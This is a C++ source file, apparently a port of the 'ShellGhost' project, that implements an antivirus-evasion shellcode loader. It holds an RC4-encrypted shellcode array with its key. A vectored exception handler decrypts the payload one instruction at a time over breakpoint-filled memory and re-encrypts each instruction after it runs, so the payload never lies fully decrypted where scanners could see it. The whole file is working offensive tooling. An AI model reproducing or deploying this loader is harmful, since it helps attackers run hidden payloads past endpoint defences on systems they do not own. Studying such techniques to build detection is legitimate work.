/*
* Title: ShellGhost
* Resources:
*	- https://github.com/lem0nSec/ShellGhost
*/
#include <Windows.h>
#include <stdio.h>
#include "ShellGhost.hpp"

LPVOID lpAllocBase = nullptr;
unsigned char shellcode[] = {
		0x62, 0xd6, 0xd6, 0x4c, 0x3c, 0x76, 0x95, 0xa8, 0xcc, 0xa8, 0xdf, 0x4, 0xdf, 0x5,
		0xcc, 0xcf, 0xc8, 0xd6, 0x64, 0x7a, 0xfb, 0x1d, 0x23, 0x9e, 0xc8, 0xd6, 0xde, 0xfa,
		0xd4, 0xd6, 0xde, 0xfa, 0xec, 0xd6, 0xde, 0xda, 0x9c, 0xd6, 0x5a, 0x1f, 0x86, 0xe2,
		0xd3, 0x64, 0x61, 0xd6, 0x64, 0x68, 0x32, 0xa2, 0x34, 0xe2, 0x57, 0xb2, 0x75, 0xdf,
		0x94, 0x61, 0xc1, 0xdf, 0x54, 0x69, 0x7c, 0xb8, 0xcc, 0xdf, 0x4, 0xd6, 0xde, 0xfa,
		0xec, 0x15, 0x17, 0x94, 0xd6, 0x54, 0x78, 0x15, 0xd5, 0x20, 0xcc, 0xa8, 0x13, 0xd6,
		0xd0, 0x68, 0xea, 0x32, 0xd6, 0x54, 0x78, 0xce, 0x15, 0x1d, 0xb0, 0xda, 0xde, 0xe8,
		0xec, 0xd7, 0x54, 0x78, 0x7d, 0x3, 0xd6, 0xaa, 0x61, 0xdf, 0xde, 0x9c, 0x44, 0xd6,
		0x54, 0x7e, 0xd3, 0x64, 0x61, 0xd6, 0x64, 0x68, 0x32, 0xdf, 0x94, 0x61, 0xc1, 0xdf,
		0x54, 0x69, 0xa6, 0xb5, 0xeb, 0xa4, 0xd2, 0x56, 0xe4, 0xe8, 0xa0, 0xdb, 0x6c, 0x79,
		0xeb, 0x8d, 0xc6, 0xda, 0xde, 0xe8, 0xe8, 0xd7, 0x54, 0x78, 0xf8, 0x14, 0x23, 0xc0,
		0xe0, 0xda, 0xde, 0xe8, 0xd0, 0xd7, 0x54, 0x78, 0xdf, 0xde, 0xac, 0x44, 0xd6, 0x54,
		0x78, 0xdf, 0xd, 0xdf, 0xd, 0xc0, 0xc7, 0xc4, 0xdf, 0xd, 0xdf, 0xc, 0xdf, 0xf, 0xd6,
		0xd6, 0x44, 0xec, 0xdf, 0x7, 0x61, 0xb5, 0xc6, 0xdf, 0xc, 0xc4, 0xd6, 0xde, 0xba,
		0x77, 0x2, 0x57, 0x33, 0x57, 0xc3, 0xd6, 0xef, 0xa9, 0xcc, 0xa8, 0x13, 0xde, 0x41,
		0xc6, 0xbc, 0xd6, 0xd8, 0x25, 0xcd, 0xa9, 0x13, 0xde, 0xdf, 0xef, 0x99, 0x47, 0xc7,
		0x94, 0x61, 0x80, 0x25, 0xb5, 0xb5, 0xe6, 0xa2, 0xdf, 0xef, 0xe, 0x59, 0x15, 0x8e,
		0x61, 0x80, 0xd6, 0xd6, 0x6c, 0xe4, 0xa2, 0x53, 0xe2, 0x5f, 0x1e, 0xae, 0x48, 0xeb,
		0x50, 0x25, 0x12, 0xbb, 0xbe, 0xc7, 0xf4, 0x55, 0xc7, 0xdf, 0xdc, 0x72, 0x61, 0x80,
		0xfd, 0xff, 0xf2, 0xfd, 0xb0, 0x30, 0xd0, 0xa9, 0x9e
};
unsigned int bufSize = sizeof(shellcode);
unsigned char k[] = { 0x3b, 0x21, 0xff, 0x41, 0xe3 };
unsigned int keySize = sizeof(k);

CRYPT_BYTES_QUOTA instruction[98];
DWORD dwInstructionCount = 98;
PVOID prevInstruction = nullptr;

// Resove null bytes at the end of .text segment.
LPVOID ResolveEndOfTextSegment() {
	HMODULE hCurrent = GetModuleHandleA(NULL);
	if (!hCurrent) return nullptr;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hCurrent;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)hCurrent + (DWORD64)pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((DWORD64)pNtHeaders + (DWORD64)sizeof(IMAGE_NT_HEADERS));
	LPVOID lpText = (LPVOID)((DWORD64)hCurrent + (DWORD64)pSecHeader->VirtualAddress);
	LPVOID lpTextNull = (LPVOID)(((DWORD64)hCurrent + (DWORD)pSecHeader->Misc.VirtualSize) + 5);

	return lpTextNull;
}

DWORD CheckAllocationProtection(LPVOID lpAlloc, DWORD dwAllocSize) {
	MEMORY_BASIC_INFORMATION pMemInfo = { 0 };
	DWORD dwProtect = 0;

	if (VirtualQuery((LPCVOID)lpAlloc, &pMemInfo, (SIZE_T)dwAllocSize)) {
		dwProtect = pMemInfo.Protect;
	}

	return dwProtect;
}

DWORD ResolveBufferFeature(PVOID ptr, INSTR_INFO dwOpt) {
	DWORD64 dwOffset = (DWORD64)ptr - (DWORD64)lpAllocBase;

	for (DWORD i = 0; i <= dwInstructionCount; i++) {
		if (dwOffset == instruction[i].RVA) {
			switch (dwOpt) {
			case INSTRUCTION_OPCODES_QUOTA:
				return instruction[i].quota;
			case INSTRUCTION_OPCODES_RVA:
				return instruction[i].RVA;
			case INSTRUCTION_OPCODES_NUMBER:
				return i;
			default:
				break;
			}
		}
	}

	return 0;
}

BOOL RestorePrevInstructionBreakpoint(PVOID ptr) {
	DWORD dwCurrentInstruction = ResolveBufferFeature(ptr, INSTRUCTION_OPCODES_NUMBER);
	for (DWORD i = 0; i < instruction[dwCurrentInstruction].quota; i++) {
		*(PBYTE)((DWORD_PTR)ptr + i) = 0xCC;
	}
	return TRUE;
}

BOOL ResolveInstructionByRva(PVOID ptr) {
	DWORD dwCurrentInstruction = ResolveBufferFeature(ptr, INSTRUCTION_OPCODES_NUMBER);
	DWORD64 rva = ResolveBufferFeature(ptr, INSTRUCTION_OPCODES_RVA);
	for (DWORD i = 0; i < instruction[dwCurrentInstruction].quota; i++) {
		*(PBYTE)((DWORD_PTR)ptr + i) = *(PBYTE)((DWORD_PTR)shellcode + rva + i);
	}
	return TRUE;
}

NTSTATUS PatchShellcodeForException(PVOID ptr) {
	HMODULE hAdv = GetModuleHandleA("advapi32.dll");
	if (!hAdv) {
		hAdv = LoadLibraryA("advapi32.dll");
		if (!hAdv) return STATUS_UNSUCCESSFUL;
	}

	USTRING buf, key;

	memset(&buf, 0, sizeof(buf));
	memset(&key, 0, sizeof(k));
	buf.buffer = (PVOID)ptr;
	buf.Length = ResolveBufferFeature(ptr, INSTRUCTION_OPCODES_QUOTA);
	key.buffer = k;
	key.Length = keySize;

	_SystemFunction032 systemFunction032 = reinterpret_cast<_SystemFunction032>(GetProcAddress(hAdv, "SystemFunction032"));
	if (!systemFunction032) return STATUS_UNSUCCESSFUL;

	NTSTATUS status = systemFunction032(&buf, &key);
	return status;
}

BOOL AdjustFunctionParameters(PCONTEXT pCtxRecord) {
	BOOL bStatus = FALSE;

	if ((pCtxRecord->Rcx >= (DWORD_PTR)lpAllocBase) && (pCtxRecord->Rcx <= ((DWORD_PTR)lpAllocBase + sizeof(shellcode)))) {
		if (*(PBYTE)pCtxRecord->Rcx == 0xCC) {
			DWORD dwCurrentInstruction = ResolveBufferFeature((PVOID)pCtxRecord->Rcx, INSTRUCTION_OPCODES_NUMBER);
			PVOID ptr = (PVOID)(pCtxRecord->Rcx);

			while (bStatus != TRUE) {
				ResolveInstructionByRva(ptr);
				PatchShellcodeForException(ptr);
				for (DWORD i = 0; i < instruction[dwCurrentInstruction].quota; i++) {
					if (*(PBYTE)((DWORD_PTR)ptr + i) == 0x00) {
						bStatus = TRUE;
						break;
					}
				}

				ptr = (PVOID)((DWORD_PTR)ptr + instruction[dwCurrentInstruction].quota);
				dwCurrentInstruction++;
			}
		}
	}

	return bStatus;
}

// Main VEH handler.
LONG CALLBACK InterceptShellcodeExecution(EXCEPTION_POINTERS* exceptionData) {
	if (((exceptionData->ContextRecord->Rip >= (DWORD64)lpAllocBase) &&
		(exceptionData->ContextRecord->Rip <= (DWORD64)lpAllocBase + sizeof(shellcode))) ||
		((LPVOID)exceptionData->ContextRecord->Rip == ResolveEndOfTextSegment())) {

		if ((LPVOID)exceptionData->ContextRecord->Rip == ResolveEndOfTextSegment()) {
			exceptionData->ContextRecord->Rip = (DWORD64)lpAllocBase;
		}

		DWORD dwOldProtect = 0;

		if (CheckAllocationProtection((LPVOID)exceptionData->ContextRecord->Rip, bufSize) == PAGE_EXECUTE_READ) {
			VirtualProtect((LPVOID)exceptionData->ContextRecord->Rip, bufSize, PAGE_READWRITE, &dwOldProtect);
		}

		if (prevInstruction >= lpAllocBase) {
			RestorePrevInstructionBreakpoint(prevInstruction);
		}

		if ((exceptionData->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) || ((LPVOID)exceptionData->ContextRecord->Rip == lpAllocBase)) {
			ResolveInstructionByRva((PVOID)exceptionData->ContextRecord->Rip);
			if (PatchShellcodeForException((PVOID)exceptionData->ContextRecord->Rip) == STATUS_UNSUCCESSFUL) {
				ExitThread(0);
			}

			prevInstruction = (PVOID)exceptionData->ContextRecord->Rip;

			if (*(PWORD)exceptionData->ContextRecord->Rip == 0xE0FF) { // jmp rax
				*(PWORD)exceptionData->ContextRecord->Rip = 0xCCCC;  // We'll never execute that jmp rax
				AdjustFunctionParameters(exceptionData->ContextRecord);
				exceptionData->ContextRecord->Rip = exceptionData->ContextRecord->Rax;
				RestorePrevInstructionBreakpoint(prevInstruction);

				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}

		VirtualProtect((LPVOID)exceptionData->ContextRecord->Rip, bufSize, PAGE_EXECUTE_READ, &dwOldProtect);

		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else {
		ExitThread(0);
	}
}

BOOL ShellGhost() {
	FreeConsole();

	// Shellcode mapping
	// https://github.com/lem0nSec/ShellGhost/blob/master/src/ShellGhost.c#L284
	instruction[0].RVA = 0;
	instruction[0].quota = 1;
	instruction[1].RVA = 1;
	instruction[1].quota = 4;
	instruction[2].RVA = 5;
	instruction[2].quota = 5;
	instruction[3].RVA = 10;
	instruction[3].quota = 2;
	instruction[4].RVA = 12;
	instruction[4].quota = 2;
	instruction[5].RVA = 14;
	instruction[5].quota = 1;
	instruction[6].RVA = 15;
	instruction[6].quota = 1;
	instruction[7].RVA = 16;
	instruction[7].quota = 1;
	instruction[8].RVA = 17;
	instruction[8].quota = 3;
	instruction[9].RVA = 20;
	instruction[9].quota = 5;
	instruction[10].RVA = 25;
	instruction[10].quota = 4;
	instruction[11].RVA = 29;
	instruction[11].quota = 4;
	instruction[12].RVA = 33;
	instruction[12].quota = 4;
	instruction[13].RVA = 37;
	instruction[13].quota = 5;
	instruction[14].RVA = 42;
	instruction[14].quota = 3;
	instruction[15].RVA = 45;
	instruction[15].quota = 3;
	instruction[16].RVA = 48;
	instruction[16].quota = 1;
	instruction[17].RVA = 49;
	instruction[17].quota = 2;
	instruction[18].RVA = 51;
	instruction[18].quota = 2;
	instruction[19].RVA = 53;
	instruction[19].quota = 2;
	instruction[20].RVA = 55;
	instruction[20].quota = 4;
	instruction[21].RVA = 59;
	instruction[21].quota = 3;
	instruction[22].RVA = 62;
	instruction[22].quota = 2;
	instruction[23].RVA = 64;
	instruction[23].quota = 1;
	instruction[24].RVA = 65;
	instruction[24].quota = 2;
	instruction[25].RVA = 67;
	instruction[25].quota = 4;
	instruction[26].RVA = 71;
	instruction[26].quota = 3;
	instruction[27].RVA = 74;
	instruction[27].quota = 3;
	instruction[28].RVA = 77;
	instruction[28].quota = 6;
	instruction[29].RVA = 83;
	instruction[29].quota = 3;
	instruction[30].RVA = 86;
	instruction[30].quota = 2;
	instruction[31].RVA = 88;
	instruction[31].quota = 3;
	instruction[32].RVA = 91;
	instruction[32].quota = 1;
	instruction[33].RVA = 92;
	instruction[33].quota = 3;
	instruction[34].RVA = 95;
	instruction[34].quota = 4;
	instruction[35].RVA = 99;
	instruction[35].quota = 3;
	instruction[36].RVA = 102;
	instruction[36].quota = 2;
	instruction[37].RVA = 104;
	instruction[37].quota = 3;
	instruction[38].RVA = 107;
	instruction[38].quota = 4;
	instruction[39].RVA = 111;
	instruction[39].quota = 3;
	instruction[40].RVA = 114;
	instruction[40].quota = 3;
	instruction[41].RVA = 117;
	instruction[41].quota = 3;
	instruction[42].RVA = 120;
	instruction[42].quota = 1;
	instruction[43].RVA = 121;
	instruction[43].quota = 4;
	instruction[44].RVA = 125;
	instruction[44].quota = 3;
	instruction[45].RVA = 128;
	instruction[45].quota = 2;
	instruction[46].RVA = 130;
	instruction[46].quota = 2;
	instruction[47].RVA = 132;
	instruction[47].quota = 5;
	instruction[48].RVA = 137;
	instruction[48].quota = 3;
	instruction[49].RVA = 140;
	instruction[49].quota = 2;
	instruction[50].RVA = 142;
	instruction[50].quota = 1;
	instruction[51].RVA = 143;
	instruction[51].quota = 4;
	instruction[52].RVA = 147;
	instruction[52].quota = 3;
	instruction[53].RVA = 150;
	instruction[53].quota = 5;
	instruction[54].RVA = 155;
	instruction[54].quota = 4;
	instruction[55].RVA = 159;
	instruction[55].quota = 3;
	instruction[56].RVA = 162;
	instruction[56].quota = 4;
	instruction[57].RVA = 166;
	instruction[57].quota = 3;
	instruction[58].RVA = 169;
	instruction[58].quota = 2;
	instruction[59].RVA = 171;
	instruction[59].quota = 2;
	instruction[60].RVA = 173;
	instruction[60].quota = 1;
	instruction[61].RVA = 174;
	instruction[61].quota = 1;
	instruction[62].RVA = 175;
	instruction[62].quota = 1;
	instruction[63].RVA = 176;
	instruction[63].quota = 2;
	instruction[64].RVA = 178;
	instruction[64].quota = 2;
	instruction[65].RVA = 180;
	instruction[65].quota = 2;
	instruction[66].RVA = 182;
	instruction[66].quota = 4;
	instruction[67].RVA = 186;
	instruction[67].quota = 2;
	instruction[68].RVA = 188;
	instruction[68].quota = 2;
	instruction[69].RVA = 190;
	instruction[69].quota = 1;
	instruction[70].RVA = 191;
	instruction[70].quota = 2;
	instruction[71].RVA = 193;
	instruction[71].quota = 1;
	instruction[72].RVA = 194;
	instruction[72].quota = 3;
	instruction[73].RVA = 197;
	instruction[73].quota = 5;
	instruction[74].RVA = 202;
	instruction[74].quota = 1;
	instruction[75].RVA = 203;
	instruction[75].quota = 10;
	instruction[76].RVA = 213;
	instruction[76].quota = 7;
	instruction[77].RVA = 220;
	instruction[77].quota = 6;
	instruction[78].RVA = 226;
	instruction[78].quota = 2;
	instruction[79].RVA = 228;
	instruction[79].quota = 5;
	instruction[80].RVA = 233;
	instruction[80].quota = 6;
	instruction[81].RVA = 239;
	instruction[81].quota = 2;
	instruction[82].RVA = 241;
	instruction[82].quota = 4;
	instruction[83].RVA = 245;
	instruction[83].quota = 2;
	instruction[84].RVA = 247;
	instruction[84].quota = 2;
	instruction[85].RVA = 249;
	instruction[85].quota = 3;
	instruction[86].RVA = 252;
	instruction[86].quota = 2;
	instruction[87].RVA = 254;
	instruction[87].quota = 5;
	instruction[88].RVA = 259;
	instruction[88].quota = 2;
	instruction[89].RVA = 261;
	instruction[89].quota = 1;
	instruction[90].RVA = 262;
	instruction[90].quota = 3;
	instruction[91].RVA = 265;
	instruction[91].quota = 2;
	instruction[92].RVA = 267;
	instruction[92].quota = 1;
	instruction[93].RVA = 268;
	instruction[93].quota = 1;
	instruction[94].RVA = 269;
	instruction[94].quota = 1;
	instruction[95].RVA = 270;
	instruction[95].quota = 1;
	instruction[96].RVA = 271;
	instruction[96].quota = 4;
	instruction[97].RVA = 275;
	instruction[97].quota = 1;

	lpAllocBase = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
	if (!lpAllocBase)
		return FALSE;

	for (DWORD i = 0; i < sizeof(shellcode); i++) {
		*(PBYTE)((DWORD_PTR)lpAllocBase + i) = 0xCC;
	}

	HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)ResolveEndOfTextSegment(), nullptr, 0, nullptr);
	if (!hThread) {
		VirtualFree(lpAllocBase, 0, MEM_RELEASE);
		return FALSE;
	}

	if (AddVectoredExceptionHandler(1, InterceptShellcodeExecution)) {
		WaitForSingleObject(hThread, INFINITE);
		RemoveVectoredExceptionHandler(InterceptShellcodeExecution);
	}

	CloseHandle(hThread);
	VirtualFree(lpAllocBase, 0, MEM_RELEASE);

	return TRUE;
}
